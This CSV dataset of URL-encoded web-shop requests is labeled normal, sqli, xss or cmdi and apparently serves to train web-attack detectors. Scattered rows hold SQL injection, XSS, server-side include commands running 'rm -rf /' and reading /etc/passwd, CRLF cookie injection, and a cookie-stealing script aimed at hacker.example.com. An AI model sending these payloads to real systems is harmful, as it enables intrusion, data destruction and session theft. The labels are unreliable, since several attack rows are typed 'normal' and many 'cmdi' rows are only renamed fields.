payload,attack_type,label
id=any%250ASet-cookie%253A%2BTamper%253D1041264011025374727,normal,1
modo=insertar&precio=460&B1=Pasar+por+caja%2F,cmdi,1
modo=registro&login=reinhard&password=d%EDdima&nombre=Heli&apellidos=Ponce+Vilda&email=scheff_guiffre%40interpretacion-diccionario-y-significado-de-los-s&dni=59779905F&direccion=El+Morejon%2C+S%2FN+11%3FD&ciudad=Arbeca&cp=39200&provincia=Segovia&ntc=8869503887772031&B1=Registrar,normal,0
errorMsg=Credenciales+incorrectas,normal,0
modo=insertar&precio=2095&B1=Pasar+por+caja,normal,0
modo=registro&login=zauhar&password=SemaNerA&nombre=Ezequiel&apellidos=Langellotti&email=schaafsma%40gay-tantra.sj&dni=75010741J&direccion=Calle+Alfaz+Del+Pi%2C+96+11%3FD&ciudad=Villanueva+del+Rebollar&cp=38450&provincia=Teruel&ntc=8198356178876064&B1=Registrar,normal,0
id=3&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=90&B1=A%F1adir+al+carrito,normal,0
id=3&nombre=vino+rioja&precio=100&cantidad=63&b1=a%f1adir+al+carrito,normal,0
modo=registro&login=briant&password=CardiaS&nombre=Elivio&apellidos=Letemendia+Dou&email=muir-vasilescu5%40lodgeinmadrid.ir&dni=19846981M&direccion=Cami+Sant+Cugat+Al+Papiol+59%2C+&ciudad=Aliaguilla&cp=22440&provincia=Zaragoza&ntc=7674396094976152&B1=Registrar,normal,0
modo=registro&login=derenzo&password=estarcido&nombre=Abercio&apellidos=Villatty+Folk&email=natheaux%40ofertasrusas.mt&dni=57150463V%27INJECTED_PARAM&direccion=Vereda+Del+Altozano%2C+41%2C+1%3FG&ciudad=Hontecillas&cp=16807&provincia=Burgos&ntc=3507828300066763&B1=Registrar,cmdi,1
errorMsg=Credenciales+incorrectas123,normal,0
errormsg=credenciales+incorrectas,normal,0
modo=registro&login=suzie&password=*694a47ndiL&nombre=Tubal&apellidos=Escaler+Astorquiza&email=seiter.segev%40mataluenga.bs&dni=14298138G&direccion=Fidelio+5+&ciudad=Boada&cp=03134&provincia=La+Rioja&ntc=7362218101347433&B1=Registrar,normal,0
id=2&nombre=Vino+Rioja&precio=85&cantidad=39&B1=A%F1adir+al+carrito123,normal,0
b2=vACIAR+CARRITOPAROS%2522%2520STYLE%3d%2522BACKGROUND%3aURL%28JAVASCRIPT%3aALERT%28%27pAROS%27%29%29,xss,1
modo=registro&login=danforth7&password=p%E10o7i%2520&nombre=Liana&apellidos=Crivill%E9+Van+Derdys&email=vuosalmi.camp%40risiberia.ph&dni=70627754K&direccion=Calle+Rosal%2C+42+4%3FD&ciudad=Casas+de+Don+Antonio&cp=17780&provincia=Segovia&ntc=8272734810678085&B1=Registrar,cmdi,1
B2=Vaciar+carrito,normal,0
id=2&nombre=Queso+Manchego&precio=39&cantidad=56&B1=A%F1adir+al+carrito,normal,0
modo=registro&login=gaudet&password=almazara&nombre=pola&apellidos=perpiny%e0+romero&email=michell4%40so-tel.jobs&dni=92309128p&direccion=c%2f+cartagena%2c+188%2c+&ciudad=villagalijo&cp=46128&provincia=huesca&ntc=6503452667221524&b1=registrar,normal,0
modo=entrar&login=slozil&pwd=ULc0r81A&remember=on&B1=Entrar123,normal,0
MODO=%3c%21--%23INCLUDE+FILE%3d%22ARCHIVO_SECRETO%22+--%3e&PRECIO=3086&b1=pASAR+POR+CAJA,sqli,1
errorMsg=%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E123,xss,1
modo=registro&login=hadel&password=hatajo&nombre=Yasna&apellidos=Brivio&email=hymen_israeli%40aulahost.vc&dni=75010741J&direccion=Cami+Llorito%2C+38+&ciudad=A%EDnsa-Sobrarbe&cp=43713&provincia=%C1lava&ntc=5968115219030593&B1=Registrar,normal,0
modo=registro&login=ming-yua&password=revacunaci%f3n&nombre=savino&apellidos=pesado+stahler&email=varley%40tecnoindomo.ki&dni=59137612n&direccion=c%2f+galicia+50+5e&ciudad=san+juan+del+monte&cp=24175&provincia=zaragoza&ntc=9568195762432395&b1=registrar,normal,0
modo=insertar&precio=4564&B1=Confirmar%2F,cmdi,1
errorMsgA=Credenciales+incorrectas,normal,1
id=1&nombre=Vino+Rioja&precio=100&cantidad=79&B1=A%F1adir+al+carrito,normal,0
B2A=Vaciar+carrito123,normal,1
B2=Vaciar+carrito,normal,0
modo=insertar&precio=2230&B1=Pasar+por+caja,normal,0
id=3%2F&nombre=Vino+Rioja&precio=85&cantidad=29&B1=A%F1adir+al+carrito,cmdi,1
modo=entrar&login=ingrey&pwd=asErTIVAmeNte&remember=off&B1=Entrar,normal,0
ID=1&NOMBRE=qUESO+mANCHEGO&PRECIO=85&CANTIDAD=%27%2c%270%27%29%3bWAITFOR+DELAY+%270%3a0%3a15%27%3b--&b1=a%f1ADIR+AL+CARRITO,sqli,1
id=2&nombre=Queso+Manchego&precio=39%2F&cantidad=71&B1=A%F1adir+al+carrito,cmdi,1
idA=2123,normal,1
modo=registro&loginA=mamie&password=mOnJA&nombre=Ecio&apellidos=Mendivil+Bellv%E9&email=wei%40alfombra.com.gw&dni=33914626E&direccion=Calle+Galera+7%2C+&ciudad=Cordobilla+de+L%E1cara&cp=03720&provincia=Santa+Cruz+de+Tenerife&ntc=6649652935543559&B1=Registrar,cmdi,1
modo=registro&login=messier&password=c7b183o&nombre=Nicodemo&apellidos=Nog*ueira+Aguayo&email=galloway%40rtce.gu&dni=35507822P&direccion=Numero+15%2C+151%2C+&ciudad=Castrillo+de+la+Guare%F1a&cp=23657&provincia=Toledo&ntc=1278501676319264&B1=Registrar,cmdi,1
id=2&nombre=Queso+Manchego&precio=100&cantidad=68&B1=A%F1adir+al+carrito123,normal,0
ERRORmSG=cREDENCIALES+INCORRECTAS%27%2c%270%27%2c%270%27%2c%270%27%2c%270%27%29%3bWAITFOR+DELAY+%270%3a0%3a15%27%3b--,sqli,1
id=1,normal,0
modo=entrar&login=marra&pwd=ContrAbasa&remember=on&B1=Entrar123,normal,0
modo=registro&login=checinsk&password=c2ad953u8ro&nombre=Neria&apellidos=Taronger&email=torgov-mattera%40yksoluap.edu&dni=74014005M&direccion=Avenida+Roque+De+Gando%2C+193%2C+7%3FE&ciudad=Castrobol&cp=26324&provincia=Cuenca&ntc=5680554856223107&B1=%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--123,sqli,1
modo=insertar%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&precio=3471&B1=Confirmar,sqli,1
errorMsg=Credenciales+incorrectas,normal,0
modo=registro&login=reynolds&password=2es8I1g73&nombre=Sandy&apellidos=Vilamasa+Pacheca&email=balsam-prey%40mmo.com.cat&dni=48707568P&direccion=Calle+Serbal%2C+190%2C+&ciudad=Barrios+de+Luna%2C+Los&cp=48277&provincia=Soria&ntc=2815170427897112&B1=Registrar,normal,0
modo=registro&login=lenka&password=096r13.a&nombre=Daher&apellidos=De+la+Ossa&email=heathcock%40catanoticias.ai&dni=5696%278AAZ&direccion=Avinguda+Josep+Tarradellas%2C+146+11%3FH&ciudad=Asparrena&cp=09614&provincia=Salamanca&ntc=9256871271036534&B1=Registrar,cmdi,1
id=1,normal,0
modo=insertar&precio=3574&B1=Pasar+por+caja%2F,cmdi,1
errorMsg=Credenciales+incorrectas,normal,0
errorMsg=paros%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2123,xss,1
modo=registro&login=saree&password=albumin%f3metro&nombre=y%e9sica&apellidos=ferr%e0s+gort%e1rez&email=maracaja%40telogis.ad&dni=42773884w&direccion=do+cotaredo%2c+147+9e&ciudad=hoyocasero&cp=44369&provincia=ja%e9n&ntc=3074022895871752&b1=registrar,normal,0
B2=Vaciar+carrito,normal,0
errorMsg=Credenciales+incorrectas123,normal,0
modo=registro&login=zahnley&password=2mpAv8nAr&nombre=Am%E9n&apellidos=Doz&email=degeistirk%40meneamex.pr&dni=41909752A&direccion=C%2F+Zahara+De+Los+Atunes%2C+137%2C+9%3FB&ciudad=Cijuela&cp=10460&provincia=Le%F3n&ntc=8219697007119352&B1=Registrar,normal,0
modo=registro&login=mazarick1&password=2a6in6rosa&nombre=Mat%EDas&apellidos=Poca+Urzagaste&email=slavova%40costablancarental.ug&dni=34081266G&direccion=Infantes+De+Carrion%2C+122+&ciudad=Valpalmas&cp=03600&provincia=%C1vila&ntc=0858629096397391&B1=Registrar123,normal,0
B2A=Vaciar+carrito,normal,1
errorMsgA=Credenciales+incorrectas,normal,1
modo=registro&login=draves&password=ro%F1IcA&nombre=Babeli&apellidos=Hermoso+Ginart&email=haver0%40iurispretor.cn&dni=paros%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&direccion=Calle+Urbina%2C+129+&ciudad=Berango&cp=33775&provincia=Le%F3n&ntc=7007903703917778&B1=Registrar123,xss,1
B2=Vaciar+carrito,normal,0
B2=Vaciar+carrito,normal,0
modo=registro&login=kelli&password=resca%F1o&nombre=An%EDcar&apellidos=Bastus+Pellini&email=wiley%40pintandomucho.va&dni=65763257R&direccion=C%2F+Cases+Noves%2C+98%2C+&ciudad=Gomesende&cp=41540&provincia=G%2Buadalajara&ntc=2592750778275929&B1=Registrar,cmdi,1
id=3&nombre=Queso+Manchego&precio=85&cantidad=42&B1=A%F1adir+al+carrito,normal,0
id=1123,normal,0
modo=registro&login=welham&password=cet%E1rea&nombre=Tarsilia&apellidos=Serradell&email=sara.bagashvili%40sunglasses.nom.gr&dni=27733046Z&direccion=Cerro+Ramaderia+S%2FN+8%3FC&ciudad=Torres&cp=02360&provincia=Lugo&ntc=3481071462529390&B1A=Registrar,cmdi,1
modo=entrar&login=hixon&pwd=incr622tO&remember=off&B1=Entrar,normal,0
modo=registro&login=brittan&password=al9mb%2B532&nombre=Onila&apellidos=Furcat+Zarco&email=greiff%40opticaweb.bu&dni=36455660Q&direccion=Calle+Nueve+57+%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&ciudad=Utiel&cp=01899&provincia=Madrid&ntc=0088492463086794&B1=Registrar,sqli,1
MODO=REGISTRO&LOGIN=ANTINUCC&PASSWORD=ZULLARSE&NOMBRE=jOS%e9+mAR%edA&APELLIDOS=rODRIGO+aMBR%f3S&EMAIL=LEIBMAN%40SOFTSTYLESTUDIO.BE&DNI=90993097z&DIRECCION=uRBANIZACION+rESIDENCIAL+rONDA+36+9%3fb&CIUDAD=rIELLS+I+vIABREA&CP=42150&PROVINCIA=tERUEL&NTC=9974355200418178&b1=%27%3bWAITFOR+DELAY+%270%3a0%3a15%27%3b--,sqli,1
ID=%3cscript%3eALERT%28%22pAROS%22%29%3b%3c%2fscript%3e,xss,1
modo=insertar&precioA=2293&B1=Pasar+por+caja,cmdi,1
id=2,normal,0
id=3&nombre=jam%f3n+ib%e9rico&precio=85&cantidad=95&b1=a%f1adir+al+carrito,normal,0
modo=registro&login=srinivas&password=camisa&nombre=Manlio&apellidos=Jorba+Bastardes&email=baziga-turtuno%40ofertasrusas.dz&dni=12188295C&direccion=Avinyo%2C+68+4%3FG&ciudad=Mora+de+Rubielos&cp=28598&provincia=Ja%E9n&ntc=8749462900315765&B1=Registrar,normal,0
id=3&nombre=Vino+Rioja%2B&precio=39&cantidad=82&B1=A%F1adir+al+carrito,cmdi,1
modo=registro&login=koolwine&password=seni%2bl&nombre=basilisa&apellidos=pimienta+rosas&email=bjerg%40hangartalleres.er&dni=78581094f&direccion=calle+profeta%2c+96%2c+2%3fc&ciudad=pineda+trasmonte&cp=29127&provincia=teruel&ntc=8866944660576355&b1=registrar,normal,0
idA=1,normal,1
modo=entrar&login=iseno**r&pwd=0axmord%F3n&remember=off&B1=Entrar,cmdi,1
MODO=INSERTAR%3c%21--%23EXEC+CMD%3d%22RM+-RF+%2f%3bCAT+%2fETC%2fPASSWD%22+--%3e&PRECIO=9874&b1=cONFIRMAR,sqli,1
modo=insertar&precio=5497&B1=Confirmar,normal,0
modo=registro&login=sonne&password=a4561o9nz68&nombre=Caleb&apellidos=Fit%E0+Irizibar&email=deering%40asociaciondearquitectoslatinoamericanos.sv&dni=70153248M&direccion=Juan+De+Salcedo%2C+158+5%3FF&ciudad=Hontanares+de+Eresma&cp=41970&provincia=Zaragoza&ntc=9068716333740358&B1=Registrar,normal,0
errorMsg=Credenciales+incorrectas,normal,0
modo=entrar&login=aguinsky%4040&pwd=ma-ternal&remember=off&B1=Entrar,cmdi,1
errorMsgA=Credenciales+incorrectas,normal,1
modo=registro&login=harty&password=torn%E9s&nombre=Doreteo&apellidos=Llobet&email=brace4%40velazquezlarra%F1aga.kz&dni=19783837L&direccion=Alcalde+Lopez+Ranca%F1o%2C+194%2C+3-E&ciudad=Vilafam%E9s&cp=09270&provincia=Valladolid&ntc=1499600534131254&B1=Registrar,normal,0
modo=registro&login=ofcparms&password=mutabIlidad&nombre=Petronio&apellidos=Pedrol&email=cadoret%40escuelamontessori.pa&dni=17229359J&direccion=Hermanas+Sanchez+Tamargo%2C+56+&ciudad=Al%2Fins&cp=13770&provincia=Huelva&ntc=9991778846189173&B1=Registrar,cmdi,1
modo=entrar&login=hately6&pwd=luJURiosaMente&remember=on&B1A=Entrar,cmdi,1
MODO=REGISTRO&LOGIN=VEEN&PASSWORD=SAR*GENT%edA&NOMBRE=vIGILIO&APELLIDOS=mITJAVILA+oCA&EMAIL=SEECK%40LAWN.GU&DNI=29573614f&DIRECCION=cALLE+rIPOLLES+83%2c+&CIUDAD=vALDERR%e1BANO&CP=16812&PROVINCIA=vALENCIA%3c%21--%23exec+CMD%3d%22LS+%2f%22--%3e&NTC=7619192104254644&b1=rEGISTRAR,sqli,1
modo=entrar&login=stetson&pwd=a9i5t2d&remember=off&B1=Entrar,normal,0
idA=2,normal,1
id=1&nombre=queso+manchego&precio=39&cantidad=44&b1=a%f1adir+al+carrito,normal,0
idA=1123,normal,1
B2=%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--123,sqli,1
modo=registro&login=calmenso&password=amanojada&nombre=Joav&apellidos=Lazcano+Lujan&email=waldon%40blueeyes.tr&dni=69469940G&direccion=Calle+Coquina%2C+5%2C+&ciudad=Lecr%EDn&cp=47480&provincia=AND+1%3D1&ntc=4840542188767205&B1=Registrar,cmdi,1
modo=registro&login=shonuck&password=9r3h7la%FA8&nombre=Hortencia&apellidos=Ma%F1%E9+Moscoso&email=valadez%40gaudio.bj&dni=81703579N&direccionA=Poligono+Amargacena+141+&ciudad=Hita&cp=06658&provincia=Barcelona&ntc=7343251905864691&B1=Registrar,cmdi,1
errorMsg=%27OR%27a%3D%27a,normal,1
modo=insertar&precio=676&B1=Confirmar%2F,cmdi,1
errorMsg=Credenciales+incorrectas123,normal,0
b2=vaciar+carrito,normal,0
modo=registro&login=lula&password=individuo&nombre=iracen&apellidos=frau+puigveh%ed&email=murphy-ekstroem%40altoguadiana.ao&dni=61128609z&direccion=calle+matula%2c+s%2fn%2c+&ciudad=cor%e7%e0&cp=42210&provincia=burgos&ntc=7915699195068000&b1=registrar,normal,0
idA=1,normal,1
modo=insertar&precio=5565&B1=paros%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29123,xss,1
modo=insertar&precio=1940&b1=pasar+por+caja,normal,0
ID=%22%3e%3c%21--%23exec+CMD%3d%22DIR+%22--%3e%3c,sqli,1
modo=insertar&precio=2373&B1=Confirmar%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--123,sqli,1
modo=registro&login=trung&password=asshole&nombre=adri%e1n&apellidos=castell%f3+sargatal&email=robelo%40moviels.me&dni=37576555y&direccion=carrer+mestre+albages+61%2c+&ciudad=benal%faa+de+las+villas&cp=09869&provincia=salamanca&ntc=0452635229820629&b1=registrar,normal,0
id=2&nombre=Vino+.*%3FRioja&precio=100&cantidad=32&B1=A%F1adir+al+carrito,cmdi,1
B2A=Vaciar+carrito123,normal,1
B2=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org123,xss,1
modo=registro&login=%2Bvonnie&password=lLaNiSca&nombre=Onella&apellidos=Wiedeman+Nal%F3n&email=sirichanya%40vinavilano.pe&dni=97036086Y&direccion=Calle+Yela+Utrilla+150+&ciudad=Villanueva+del+Trabuco&cp=37450&provincia=M%E1laga&ntc=3862460916827849&B1=Registrar,cmdi,1
b2a=vaciar+carrito,normal,1
idA=2123,normal,1
modo=entrar&login=papageno&pwd=511aMAsa&remember=off&B1=Entrar,normal,0
B2A=Vaciar+carrito123,normal,1
errorMsg=Credenciales+incorrectas,normal,0
errorMsg=Credenciales+incorrectas,normal,0
modo=registro&login=christel&password=%3Ft3a01bl1&nombre=Nador&apellidos=Paredes&email=cancellieri%40enla.fr&dni=39547146A&direccion=Calle+Bodegon+141+7B&ciudadA=Sant+Ferriol&cp=09680&provincia=Alicante&ntc=3806763384332425&B1=Registrar,cmdi,1
id=2&nombre=jam%f3n+ib%e9rico&precio=100&cantidad=6&b1=a%f1adir+al+carrito,normal,0
B2=Vaciar+carrito123,normal,0
b2=vaciar+carrito,normal,0
modo=registro&login=kessiah&password=es%2Cbatimento&nombre=Ruth&apellidos=Burch+Echaniz&email=gandett%40cajucar.az&dni=77572920S&direccion=Pl.+Eduardo+Chillida%2C+40+&ciudad=Sanxenxo&cp=17161&provincia=Zamora&ntc=2803074671836038&B1=Registrar,cmdi,1
errorMsg=Credenciales+incorrectas,normal,0
id=3&nombre=Queso+Manchego&precio=39&cantidad=45&B1=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E,cmdi,1
modo=entrar&login=stockwel&pwd=carteo+&remember=off&B1=Entrar,cmdi,1
B2A=Vaciar+carrito,normal,1
modo=registro&login=sayeeda2&password=ce5ast20c%3Fea&nombre=Rafi&apellidos=Trill+Argando%F1a&email=ardisson%40ajuntamentdebarcelona20.nf&dni=21898288B&direccion=Pl.+Libertad+192%2C+&ciudad=Torres+del+Carrizal&cp=16393&provincia=Albacete&ntcA=9343823588037445&B1=Registrar,cmdi,1
b2a=vaciar+carrito,normal,1
id=1&nombreA=Vino+Rioja&precio=85&cantidad=15&B1=A%F1adir+al+carrito,cmdi,1
modo=insertar&precioA=1202&B1=Pasar+por+caja,cmdi,1
modo=insertar&precio=2026&B1=Confirmarany%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727,cmdi,1
errorMsg=Credenciales+incorrectas,normal,0
modo=registro&login=bulanda&password=co3trI%F1ir&nombre=Beatriz&apellidos=Cartoni.+_Mendiz.%E1bal&email=binney8%40telogis.lb&dni=39498492V&direccion=Calle+Atico+Noguerol+192%2C+7E&ciudad=Elduain&cp=22190&provincia=Toledo&ntc=1924133576102581&B1=Registrar,cmdi,1
id=2&nombre=Vino+Rioja&precio=39&cantidad=%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&B1=A%F1adir+al+carrito,sqli,1
MODO=ENTRAR&LOGIN=BUZZY&PWD=imPR37e4197D9&REMEMBER=ON&b1=PAROS%2522%2bSTYLE%253d%2522BACKGROUND%253aURL%2528JAVASCRIPT%253aALERT%2528%2527pAROS%2527%2529%2529%26ID%3d2,xss,1
modo=registro&login=charlesb&password=m96fan19&nombre=Durante&apellidos=Campusano+Caldero&email=gheorghiu-battaglia%40sanchezgordo.bt&dni=44335499D&direccion=C%2F+Padre+Luis+Maria+Arteche+0+5B&ciudad=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C&cp=37716&provincia=Cantabria&ntc=6556979183874771&B1=Registrar123,sqli,1
errorMsg=Credenciales+incorrectas123,normal,0
id=1&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidadA=56&B1=A%F1adir+al+carrito,cmdi,1
modo=registro&login=winifred5&password=.lapidosa&nombre=Lucidio&apellidos=Barrenechea+Sadurn%ED&email=rogan-darrieux%40rocofer.tc&dni=76833580X&direccion=Tratado+De+Niza%2C+96+&ciudad=Zael&cp=12466&provincia=Burgos&ntc=8678590960416701&B1=Registrar,normal,0
modo=entrar&login=ozer&pwd=fruct%EDferamente&remember=off&B1=Entrar,normal,0
modo=registro&login=arda&password=e4can7ilader0&nombre=Aristi%F3n&apellidos=Masvidal+Canino&email=pepe.whitehead%40jaxiaabogadosyeconomistas.nr&dni=45518730M&direccion=Alqueria+De+Coca+38%2C+&ciudad=Membr%EDo&cp=05140&provincia=Guadalajara&ntc=1729966765537707&B1=Registrar123,normal,0
idA=2,normal,1
modo=insertar%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&precio=4179&B1=Confirmar123,sqli,1
modo=entrar&login=johanne&pwdA=pazguat5&remember=off&B1=Entrar,cmdi,1
modo=registro&login=korbel&password=llorador&nombre=Dagmar&apellidos=Jim%E9nez+Algora&email=newtell%40theroxyblue.ir&dni=86015906T&direccion=Calle+Sant+Pau%2C+117%2C+&ciudad=Ibdes&cp=28729&provincia=Guadalajara&ntc=1846096870233397&B1=Registrar,normal,0
id=2,normal,0
id=3&nombre=queso+manchego&precio=85&cantidad=9&b1=a%f1adir+al+carrito,normal,0
id=1%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E,sqli,1
modo=entrar&login=info-man5&pwd=franqueable&remember=on&B1A=Entrar,cmdi,1
errormsg=credenciales+incorrectas,normal,0
modo=registro&login=clennito&password=4ntra6a&nombre=Davel&apellidos=Blanc+Hormachea&email=jelisic%40sevach.pf&dni=83513142G&direccion=C%2F+Mijancas%2C+154+3%3FC&ciudad=Relleu&cp=17773&provincia=Albacete&ntc=4260479237625494&B1=Registrar123,normal,0
errormsga=credenciales+incorrectas,normal,1
modo=registro&login=minette&password=aseguir&nombre=Tel%E9maco&apellidos=Poblete+Fiuza&email=messenger%40blanquillos.pk&dni=76591879Q&direccion=Calle+Orion+74%2C+&ciudad=Villazala&cp=26291&provincia=Ja%E9n&ntc=0861204544361308&B1=Registrar123,normal,0
modo=entrar&login=shan-min&pwd=mu9d6c09&remember=on&b1=entrar,normal,0
modo=entrar&login=dalt&pwd=d0s9pi2car&remember=off&b1=entrar,normal,0
id=2bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org,xss,1
modo=registro&loginA=prashant&password=l1n1sa&nombre=Grey&apellidos=Montaner+Espinosa&email=gempart.moor%40guejosgratis.br&dni=27979477T&direccion=Calle+La+Le%F1a+27+&ciudad=Collbat%F3&cp=17180&provincia=Girona&ntc=7582936564650481&B1=Registrar,cmdi,1
id=3&nombre=Queso+Manchego&precio=85%2F&cantidad=14&B1=A%F1adir+al+carrito,cmdi,1
modoA=insertar&precio=3089&B1=Pasar+por+caja,cmdi,1
id=2,normal,0
modo=entrar&login=yokono5any%250ASet-cookie%253A%2BTamper%253D1041264011025374727&pwd=yuntar&remember=off&B1=Entrar,cmdi,1
modo=insertar&precio=1368&B1=Pasar+por+caja,normal,0
modo=registro&login=hadrian&password=celula1io&nombre=Jaqueline&apellidos=Godoy+Fradera&email=shih_brusse%40professionalhost.jp&dni=53933880F&direccion=Plza.+De+Los+Conquistadores+182+&ciudad=Morales+del+Vino&cp=40171&provincia=Valencia&ntc=1541444021319279&B1=Registrar,normal,0
id=2,normal,0
B2=Vaciar+carrito123,normal,0
B2=Vaciar+carrito,normal,0
modo=registro&login=katcher&password=garda&nombre=Nail%E9&apellidos=Buils+Szebesta&email=laurance%40familiamarino.td&dni=79144797A&direccion=C%2F+Juan+Garcia+Abellan%2C+25+6%3FE&ciudad=M%E1laga&cp=43426&provincia=Sevilla&ntc=1721621291601250&B1=Registrar,normal,0
id=3&nombre=Jam%F3n%27+Ib%E9ric-%27o&precio=39&cantidad=49&B1=A%F1adir+al+carrito,cmdi,1
modo=insertar&precio=7576&B1=Pasar+por+caja,normal,0
modo=registro&login=brightwe&password=Per8eBiMie0TO&nombre=Bardo&apellidos=Furnari+Pentinat&email=baxley%40italianmotorvillagesevilla.sh&dni=43962447V&direccion=C%2F+Coronel+Cervi%F1o+Nu%F1ez%2C+35+3-C&ciudad=Llinars+del+Vall%E8s&cp=08181&provincia=Ourense&ntc=0949927790340653&B1=Registrar,normal,0
modo=registro&login=%2520&password=muti35o&nombre=Ralston&apellidos=J%E9rica+Funosa&email=mineau-bear%40guiapolicial.mx&dni=90125861Q&direccion=C%2F+Juan+Butrague%F1o%2C+92+9%3FD&ciudad=Castilfr%EDo+de+la+Sierra&cp=41566&provincia=Guadalajara&ntc=3683134199988856&B1=Registrar,cmdi,1
modo=insertar&precio=2225&b1=pasar+por+caja,normal,0
modo=entrar&login=haiping&pwd=promanar&remember=on&B1=Entrar,normal,0
id=1any%250ASet-cookie%253A%2BTamper%253D1041264011025374727,normal,1
MODO=REGISTRO&LOGIN=TORSTEN&PASSWORD=QUIENQ%21UIER&NOMBRE=cECILIANO&APELLIDOS=dE+LA+lLAVE+gRAELL&EMAIL=TAMBOR%40ARCHIVODEIMAGENES.MU&DNI=79001087c&DIRECCION=c%2f+rECANTO+dA+mAPOULA+87+8%3fa&CIUDAD=lUZAIDE%2fvALCARLOS&CP=33610&PROVINCIA=mADRID&NTC=3747055026532862%27%2c%270%27%29%3bWAITFOR+DELAY+%270%3a0%3a15%27%3b--&b1=rEGISTRAR,sqli,1
B2=Vaciar+carrito,normal,0
modo=insertar&precio=571&B1=Confirmar,normal,0
B2A=Vaciar+carrito,normal,1
errormsg=credenciales+incorrectas,normal,0
id=1sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E,normal,1
modo=registro&login=khalid&password=eS2O135mie5tO&nombre=Erasio&apellidos=Bonfiglio+Cabanas&email=kops%40estarencasa.bb&dni=45263368N&direccion=C%2F+Mineria%2C+151+13%3FG&ciudad=Estamariu&cp=08181&provincia=Le%F3n&ntc=7545332607068950&B1=Registrar,normal,0
id=2,normal,0
id=3&nombre=Vino+Rioja&precio=100&cantidad=AND+1%3D1&B1=A%F1adir+al+carrito,cmdi,1
modo=registro&login=helaina&password=ge%F3logo&nombre=Nella&apellidos=Tapies+Ximenis&email=foulk%40eonon.com.es&dni=49339665L&direccion=Sagrada+Familia+124%2C+5%3FB&ciudad=Torres+de+la+Alameda&cp=17130&provincia=Alicante&ntc=8339229633184139&B1=Registrar,normal,0
id=2,normal,0
idA=1123,normal,1
modo=insertar&precio=8384&B1=Pasar+por+caja%2F,cmdi,1
modo=entrar&login=yutaka&pwd=OficioS%24O&remember=off&B1=Entrar,normal,0
modo=registro&login=arjun1&password=lan%24%CDa&nombre=Walkiria&apellidos=Tirado+Paulet&email=arlen%40cienciapolicial.va&dni=61317153G&direccion=Gongora%2C+129+&ciudad=Gabiria&cp=13333&provincia=Segovia&ntc=6277517976007301&B1A=Registrar,cmdi,1
modo=registro&login=karolefs&password=cagarria&nombre=maisa&apellidos=bubnjar+cangalaya&email=lisser-grebeshkova%40hipermadrid.lv&dni=65472744r&direccion=calle+aza%f1a%2c+s%2fn%2c+10%3fa&ciudad=hoyocasero&cp=45681&provincia=%c1vila&ntc=5619033221013076&b1=registrar,normal,0
modo=insertar&precio=3565&B1=Pasar+por+caja%2F,cmdi,1
errorMsg=Credenciales+incorrectas%257C123,normal,1
